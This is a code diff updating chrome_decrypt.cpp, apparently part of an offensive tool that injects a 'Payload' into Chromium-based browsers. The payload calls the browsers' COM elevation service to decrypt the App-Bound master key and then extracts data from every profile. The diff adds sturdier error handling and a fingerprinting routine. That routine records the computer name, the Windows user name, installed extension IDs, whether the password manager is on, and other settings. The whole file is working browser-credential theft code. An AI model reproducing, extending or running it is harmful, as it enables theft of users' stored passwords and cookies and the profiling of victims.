@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.15.0 (c) Alexander 'xaitax' Hagenah
+// v0.16.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -7,6 +7,7 @@
 #include <wrl/client.h>
 #include <bcrypt.h>
 #include <Wincrypt.h>
+#include <Lmcons.h>
 
 #include <fstream>
 #include <sstream>
@@ -31,6 +32,8 @@
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "version.lib")
+#pragma comment(lib, "advapi32.lib")
 
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -485,11 +488,17 @@ namespace Payload
         std::vector<uint8_t> Decrypt(const Browser::Config &config, const fs::path &localStatePath)
         {
             m_logger.Log("[*] Reading Local State file: " + localStatePath.u8string());
+
+            if (!fs::exists(localStatePath))
+            {
+                throw std::runtime_error("Local State file not found: " + localStatePath.u8string());
+            }
+
             auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);
 
             BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encryptedKeyBlob.data()), (UINT)encryptedKeyBlob.size());
             if (!bstrEncKey)
-                throw std::runtime_error("SysAllocStringByteLen for encrypted key failed.");
+                throw std::runtime_error("Memory allocation failed for encrypted key");
             auto bstrEncGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(bstrEncKey, &SysFreeString);
 
             BSTR bstrPlainKey = nullptr;
@@ -503,28 +512,58 @@ namespace Payload
             {
                 Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
                 hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
-                if (SUCCEEDED(hr))
+                if (FAILED(hr))
                 {
-                    CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
-                    hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
+                    std::ostringstream oss;
+                    oss << "Failed to create COM instance for Edge. HRESULT: 0x" << std::hex << hr;
+                    throw std::runtime_error(oss.str());
                 }
+
+                hr = CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+                if (FAILED(hr))
+                {
+                    m_logger.Log("[-] Warning: CoSetProxyBlanket failed, continuing anyway");
+                }
+
+                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
             }
             else
             {
                 Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
                 hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
-                if (SUCCEEDED(hr))
+                if (FAILED(hr))
                 {
-                    CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
-                    hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
+                    std::ostringstream oss;
+                    oss << "Failed to create COM instance for " << config.name << ". HRESULT: 0x" << std::hex << hr;
+                    throw std::runtime_error(oss.str());
                 }
+
+                hr = CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+                if (FAILED(hr))
+                {
+                    m_logger.Log("[-] Warning: CoSetProxyBlanket failed, continuing anyway");
+                }
+
+                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
             }
             bstrPlainGuard.reset(bstrPlainKey);
 
-            if (FAILED(hr) || !bstrPlainKey || SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
+            if (FAILED(hr))
             {
                 std::ostringstream oss;
-                oss << "IElevator->DecryptData failed. HRESULT: 0x" << std::hex << hr;
+                oss << "COM DecryptData failed. HRESULT: 0x" << std::hex << hr << " COM Error: 0x" << comErr;
+                throw std::runtime_error(oss.str());
+            }
+
+            if (!bstrPlainKey)
+            {
+                throw std::runtime_error("DecryptData returned null key");
+            }
+
+            if (SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
+            {
+                std::ostringstream oss;
+                oss << "Decrypted key has wrong size: " << SysStringByteLen(bstrPlainKey) << " (expected " << Crypto::KEY_SIZE << ")";
                 throw std::runtime_error(oss.str());
             }
 
@@ -706,17 +745,214 @@ namespace Payload
             ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
             auto profilePaths = enumerator.FindProfiles();
 
+            int successfulProfiles = 0;
+            int failedProfiles = 0;
+
             for (const auto &profilePath : profilePaths)
             {
-                m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
-                for (const auto &dataConfig : Data::GetExtractionConfigs())
+                try
                 {
-                    DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
-                    extractor.Extract();
+                    m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
+                    for (const auto &dataConfig : Data::GetExtractionConfigs())
+                    {
+                        DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
+                        extractor.Extract();
+                    }
+                    successfulProfiles++;
+                }
+                catch (const std::exception &e)
+                {
+                    m_logger.Log("[-] Profile " + profilePath.filename().u8string() +
+                                 " extraction failed: " + std::string(e.what()) + " (continuing with others)");
+                    failedProfiles++;
+                    continue;
                 }
             }
 
-            m_logger.Log("[*] All profiles processed. Decryption process finished.");
+            m_logger.Log("[*] Extraction complete: " + std::to_string(successfulProfiles) +
+                         " successful, " + std::to_string(failedProfiles) + " failed.");
+
+            if (m_extractFingerprint)
+            {
+                try
+                {
+                    ExtractBrowserFingerprint(browserManager, browserConfig);
+                }
+                catch (const std::exception &e)
+                {
+                    m_logger.Log("[-] Fingerprint extraction failed: " + std::string(e.what()));
+                }
+            }
+        }
+
+        void ExtractBrowserFingerprint(const BrowserManager &browserManager, const Browser::Config &browserConfig)
+        {
+            m_logger.Log("[*] Extracting browser fingerprint data...");
+
+            std::ostringstream fingerprint;
+            fingerprint << "{\n";
+            fingerprint << "  \"browser\": \"" + browserConfig.name + "\",\n";
+
+            char exePath[MAX_PATH] = {0};
+            GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+            DWORD handle = 0;
+            DWORD versionInfoSize = GetFileVersionInfoSizeA(exePath, &handle);
+            if (versionInfoSize > 0)
+            {
+                std::vector<BYTE> versionData(versionInfoSize);
+                if (GetFileVersionInfoA(exePath, 0, versionInfoSize, versionData.data()))
+                {
+                    VS_FIXEDFILEINFO *fileInfo = nullptr;
+                    UINT len = 0;
+                    if (VerQueryValueA(versionData.data(), "\\", (LPVOID *)&fileInfo, &len))
+                    {
+                        fingerprint << "  \"browser_version\": \"" << HIWORD(fileInfo->dwFileVersionMS) << "."
+                                    << LOWORD(fileInfo->dwFileVersionMS) << "."
+                                    << HIWORD(fileInfo->dwFileVersionLS) << "."
+                                    << LOWORD(fileInfo->dwFileVersionLS) << "\",\n";
+                    }
+                }
+            }
+
+            fingerprint << "  \"executable_path\": \"" + Utils::EscapeJson(exePath) + "\",\n";
+
+            fingerprint << "  \"user_data_path\": \"" + Utils::EscapeJson(browserManager.getUserDataRoot().u8string()) + "\",\n";
+
+            fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
+            if (fs::exists(localStatePath))
+            {
+                std::ifstream f(localStatePath);
+                if (f)
+                {
+                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
+
+                    size_t accountPos = content.find("\"account_info\"");
+                    fingerprint << "  \"sync_enabled\": " << (accountPos != std::string::npos ? "true" : "false") << ",\n";
+
+                    size_t enterprisePos = content.find("\"enterprise\"");
+                    fingerprint << "  \"enterprise_managed\": " << (enterprisePos != std::string::npos ? "true" : "false") << ",\n";
+
+                    std::string channel = "stable";
+                    if (content.find("\"beta\"") != std::string::npos)
+                        channel = "beta";
+                    else if (content.find("\"dev\"") != std::string::npos)
+                        channel = "dev";
+                    else if (content.find("\"canary\"") != std::string::npos)
+                        channel = "canary";
+                    fingerprint << "  \"update_channel\": \"" << channel << "\",\n";
+
+                    size_t searchPos = content.find("\"default_search_provider_data\"");
+                    if (searchPos != std::string::npos)
+                    {
+                        std::string searchProvider = "unknown";
+                        if (content.find("\"google\"", searchPos) != std::string::npos)
+                            searchProvider = "Google";
+                        else if (content.find("\"bing\"", searchPos) != std::string::npos)
+                            searchProvider = "Bing";
+                        else if (content.find("\"duckduckgo\"", searchPos) != std::string::npos)
+                            searchProvider = "DuckDuckGo";
+                        fingerprint << "  \"default_search_engine\": \"" << searchProvider << "\",\n";
+                    }
+
+                    size_t hwAccelPos = content.find("\"hardware_acceleration_mode_enabled\"");
+                    fingerprint << "  \"hardware_acceleration\": " << (hwAccelPos != std::string::npos ? "true" : "false") << ",\n";
+                }
+            }
+
+            fs::path prefsFile = browserManager.getUserDataRoot() / "Default" / "Preferences";
+            if (fs::exists(prefsFile))
+            {
+                std::ifstream f(prefsFile);
+                if (f)
+                {
+                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
+
+                    size_t autofillPos = content.find("\"autofill\"");
+                    fingerprint << "  \"autofill_enabled\": " << (autofillPos != std::string::npos ? "true" : "false") << ",\n";
+
+                    size_t pwdMgrPos = content.find("\"credentials_enable_service\"");
+                    fingerprint << "  \"password_manager_enabled\": " << (pwdMgrPos != std::string::npos ? "true" : "false") << ",\n";
+
+                    size_t safeBrowsingPos = content.find("\"safebrowsing\"");
+                    fingerprint << "  \"safe_browsing_enabled\": " << (safeBrowsingPos != std::string::npos ? "true" : "false") << ",\n";
+                }
+            }
+
+            fs::path extensionsPath = browserManager.getUserDataRoot() / "Default" / "Extensions";
+            int extensionCount = 0;
+            std::vector<std::string> extensionIds;
+
+            if (fs::exists(extensionsPath))
+            {
+                for (const auto &extEntry : fs::directory_iterator(extensionsPath))
+                {
+                    if (extEntry.is_directory())
+                    {
+                        extensionCount++;
+                        extensionIds.push_back(extEntry.path().filename().string());
+                    }
+                }
+            }
+            fingerprint << "  \"installed_extensions_count\": " << extensionCount << ",\n";
+
+            if (!extensionIds.empty())
+            {
+                fingerprint << "  \"extension_ids\": [";
+                for (size_t i = 0; i < extensionIds.size(); ++i)
+                {
+                    fingerprint << "\"" << extensionIds[i] << "\"";
+                    if (i < extensionIds.size() - 1)
+                        fingerprint << ", ";
+                }
+                fingerprint << "],\n";
+            }
+
+            ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
+            auto profiles = enumerator.FindProfiles();
+            fingerprint << "  \"profile_count\": " << profiles.size() << ",\n";
+
+            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+            DWORD size = sizeof(computerName);
+            if (GetComputerNameA(computerName, &size))
+            {
+                fingerprint << "  \"computer_name\": \"" << computerName << "\",\n";
+            }
+
+            char userName[256];
+            DWORD userSize = sizeof(userName);
+            if (GetUserNameA(userName, &userSize))
+            {
+                fingerprint << "  \"windows_user\": \"" << userName << "\",\n";
+            }
+
+            if (fs::exists(localStatePath))
+            {
+                auto ftime = fs::last_write_time(localStatePath);
+                auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
+                    ftime - fs::file_time_type::clock::now() + std::chrono::system_clock::now());
+                auto time = std::chrono::system_clock::to_time_t(sctp);
+                fingerprint << "  \"last_config_update\": " << time << ",\n";
+            }
+
+            auto now = std::chrono::system_clock::now();
+            auto now_time = std::chrono::system_clock::to_time_t(now);
+            fingerprint << "  \"extraction_timestamp\": " << now_time << "\n";
+
+            fingerprint << "}";
+
+            fs::path fingerprintFile = m_outputPath / browserConfig.name / "fingerprint.json";
+            std::error_code ec;
+            fs::create_directories(fingerprintFile.parent_path(), ec);
+            if (!ec)
+            {
+                std::ofstream out(fingerprintFile);
+                if (out)
+                {
+                    out << fingerprint.str();
+                    m_logger.Log("[+] Browser fingerprint extracted to " + fingerprintFile.u8string());
+                }
+            }
         }
 
     private:
@@ -724,7 +960,13 @@ namespace Payload
         {
             char buffer[MAX_PATH + 1] = {0};
             DWORD bytesRead = 0;
+
             ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
+
+            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
+            buffer[bytesRead] = '\0';
+            m_extractFingerprint = (std::string(buffer) == "FINGERPRINT_TRUE");
+
             ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
             buffer[bytesRead] = '\0';
             m_outputPath = buffer;
@@ -732,6 +974,7 @@ namespace Payload
 
         PipeLogger m_logger;
         fs::path m_outputPath;
+        bool m_extractFingerprint = false;
     };
 }
 
